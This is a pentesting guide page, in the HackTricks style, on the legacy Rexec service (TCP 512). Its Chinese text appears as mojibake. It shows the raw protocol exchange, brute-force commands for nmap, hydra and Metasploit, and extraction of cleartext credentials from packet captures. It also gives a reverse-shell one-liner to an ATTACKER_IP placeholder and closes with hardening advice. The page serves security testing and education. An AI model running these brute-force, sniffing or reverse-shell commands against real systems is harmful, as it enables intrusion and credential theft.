# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

Rexec (remote **exec**) æ˜¯æœ€åˆçš„ Berkeley *r*-services å¥—ä»¶ä¹‹ä¸€ï¼ˆä¸ `rlogin`ã€`rsh` ç­‰ä¸€èµ·ï¼‰ã€‚å®ƒæä¾›äº†ä¸€ç§ **è¿œç¨‹å‘½ä»¤æ‰§è¡Œ** åŠŸèƒ½ï¼Œ**ä»…é€šè¿‡æ˜æ–‡ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œèº«ä»½éªŒè¯**ã€‚è¯¥åè®®åœ¨1980å¹´ä»£åˆå®šä¹‰ï¼ˆå‚è§ RFC 1060ï¼‰ï¼Œå¦‚ä»Šè¢«è®¤ä¸ºæ˜¯ **è®¾è®¡ä¸Šä¸å®‰å…¨** çš„ã€‚ç„¶è€Œï¼Œå®ƒåœ¨æŸäº›é—ç•™çš„ UNIX / ç½‘ç»œé™„åŠ è®¾å¤‡ä¸­ä»ç„¶é»˜è®¤å¯ç”¨ï¼Œå¹¶ä¸”åœ¨å†…éƒ¨æ¸—é€æµ‹è¯•ä¸­å¶å°”ä¼šå‡ºç°ã€‚

**é»˜è®¤ç«¯å£ï¼š** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> ğŸ”¥ æ‰€æœ‰æµé‡ â€“ åŒ…æ‹¬å‡­æ® â€“ éƒ½æ˜¯ä»¥**æœªåŠ å¯†**çš„æ–¹å¼ä¼ è¾“çš„ã€‚ä»»ä½•èƒ½å¤Ÿå—…æ¢ç½‘ç»œçš„äººéƒ½å¯ä»¥æ¢å¤ç”¨æˆ·åã€å¯†ç å’Œå‘½ä»¤ã€‚

### åè®®å¿«é€ŸæŸ¥çœ‹

1. å®¢æˆ·ç«¯è¿æ¥åˆ° TCP 512ã€‚
2. å®¢æˆ·ç«¯å‘é€ä¸‰ä¸ª**ä»¥ NUL ç»“å°¾**çš„å­—ç¬¦ä¸²ï¼š
* å®ƒå¸Œæœ›æ¥æ”¶ stdout/stderr çš„ç«¯å£å·ï¼ˆä»¥ ASCII å½¢å¼ï¼Œé€šå¸¸ä¸º `0`ï¼‰ï¼Œ
* **ç”¨æˆ·å**ï¼Œ
* **å¯†ç **ã€‚
3. å‘é€ä¸€ä¸ªä»¥ NUL ç»“å°¾çš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«è¦æ‰§è¡Œçš„**å‘½ä»¤**ã€‚
4. æœåŠ¡å™¨å›å¤ä¸€ä¸ªå•ä¸€çš„ 8 ä½çŠ¶æ€å­—èŠ‚ï¼ˆ0 = æˆåŠŸï¼Œ`1` = å¤±è´¥ï¼‰ï¼Œåè·Ÿå‘½ä»¤è¾“å‡ºã€‚

è¿™æ„å‘³ç€ä½ å¯ä»¥ä»…ä½¿ç”¨ `echo -e` å’Œ `nc` é‡ç°è¯¥äº¤æ¢ï¼š
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
å¦‚æœå‡­æ®æœ‰æ•ˆï¼Œæ‚¨å°†ç›´æ¥åœ¨åŒä¸€è¿æ¥ä¸Šæ”¶åˆ° `id` çš„è¾“å‡ºã€‚

### ä½¿ç”¨å®¢æˆ·ç«¯çš„æ‰‹åŠ¨æ–¹å¼

è®¸å¤šLinuxå‘è¡Œç‰ˆä»ç„¶åœ¨ **inetutils-rexec** / **rsh-client** åŒ…ä¸­æä¾›ä¼ ç»Ÿå®¢æˆ·ç«¯ï¼š
```bash
rexec -l user -p password <target> "uname -a"
```
å¦‚æœçœç•¥ `-p`ï¼Œå®¢æˆ·ç«¯å°†ä»¥äº¤äº’æ–¹å¼æç¤ºè¾“å…¥å¯†ç ï¼ˆåœ¨ç½‘ç»œä¸Šä»¥æ˜æ–‡å½¢å¼å¯è§ï¼ï¼‰ã€‚

---
## æšä¸¾ä¸æš´åŠ›ç ´è§£

### [**æš´åŠ›ç ´è§£**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE ä½¿ç”¨ä¸Šè¿°åè®®å¿«é€Ÿå°è¯•å‡­æ®ã€‚

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` å…·æœ‰ä¸“é—¨çš„ **rexec** æ¨¡å—ï¼Œå¹¶ä¸”ä»ç„¶æ˜¯æœ€å¿«çš„ç¦»çº¿æš´åŠ›ç ´è§£å·¥å…·ã€‚ `medusa` (`-M REXEC`) å’Œ `ncrack` (`rexec` æ¨¡å—) å¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼ä½¿ç”¨ã€‚

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
è¯¥æ¨¡å—å°†åœ¨æˆåŠŸæ—¶ç”Ÿæˆä¸€ä¸ªshellï¼Œå¹¶å°†å‡­æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚

---
## æ•è·å‡­æ®

ç”±äºæ‰€æœ‰å†…å®¹éƒ½æ˜¯æ˜æ–‡çš„ï¼Œ**ç½‘ç»œæ•è·æ˜¯æ— ä»·çš„**ã€‚é€šè¿‡å¤åˆ¶æµé‡ï¼Œæ‚¨å¯ä»¥åœ¨ä¸æ¥è§¦ç›®æ ‡çš„æƒ…å†µä¸‹æå–å‡­æ®ï¼š
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark ä¸­å¯ç”¨ *Decode As â€¦â€‹* TCP 512 â†’ REXEC ä»¥æŸ¥çœ‹è§£æè‰¯å¥½çš„å­—æ®µã€‚)

---
## åæœŸåˆ©ç”¨æç¤º

* ä»¥æä¾›ç”¨æˆ·çš„æƒé™è¿è¡Œå‘½ä»¤ã€‚å¦‚æœ `/etc/pam.d/rexec` é…ç½®é”™è¯¯ï¼ˆä¾‹å¦‚ `pam_rootok`ï¼‰ï¼Œæœ‰æ—¶å¯ä»¥è·å¾— root shellã€‚
* Rexec å¿½ç•¥ç”¨æˆ·çš„ shellï¼Œé€šè¿‡ `/bin/sh -c <cmd>` æ‰§è¡Œå‘½ä»¤ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å…¸å‹çš„ shell è½¬ä¹‰æŠ€å·§ï¼ˆ`;`ã€``$( )``ã€åå¼•å·ï¼‰æ¥é“¾æ¥å¤šä¸ªå‘½ä»¤æˆ–ç”Ÿæˆåå‘ shellï¼š
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* å¯†ç é€šå¸¸å­˜å‚¨åœ¨ **~/.netrc** ä¸­ï¼›å¦‚æœæ‚¨æ”»é™·ä¸€ä¸ªä¸»æœºï¼Œå¯ä»¥å°†å…¶ç”¨äºæ¨ªå‘ç§»åŠ¨ã€‚

---
## åŠ å›º / æ£€æµ‹

* **ä¸è¦æš´éœ² rexec**ï¼›ç”¨ SSH æ›¿ä»£ã€‚å‡ ä¹æ‰€æœ‰ç°ä»£çš„ *inetd* è¶…çº§æœåŠ¡å™¨é»˜è®¤éƒ½ä¼šæ³¨é‡Šæ‰è¯¥æœåŠ¡ã€‚
* å¦‚æœå¿…é¡»ä¿ç•™å®ƒï¼Œè¯·ä½¿ç”¨ TCP åŒ…è£…å™¨ï¼ˆ`/etc/hosts.allow`ï¼‰æˆ–é˜²ç«å¢™è§„åˆ™é™åˆ¶è®¿é—®ï¼Œå¹¶å¼ºåˆ¶æ‰§è¡Œå¼ºå¯†ç ã€‚
* ç›‘æ§åˆ° :512 çš„æµé‡å’Œ `rexecd` è¿›ç¨‹å¯åŠ¨ã€‚ä¸€æ¬¡æ•°æ®åŒ…æ•è·å°±è¶³ä»¥æ£€æµ‹åˆ°è¢«æ”»é™·ã€‚
* ä¸€èµ·ç¦ç”¨ `rexec`ã€`rlogin`ã€`rsh` â€“ å®ƒä»¬å…±äº«å¤§éƒ¨åˆ†ç›¸åŒçš„ä»£ç åº“å’Œå¼±ç‚¹ã€‚

---

## å‚è€ƒæ–‡çŒ®

* Nmap NSE `rexec-brute` æ–‡æ¡£ â€“ [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Rapid7 Metasploit æ¨¡å— `auxiliary/scanner/rservices/rexec_login` â€“ [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
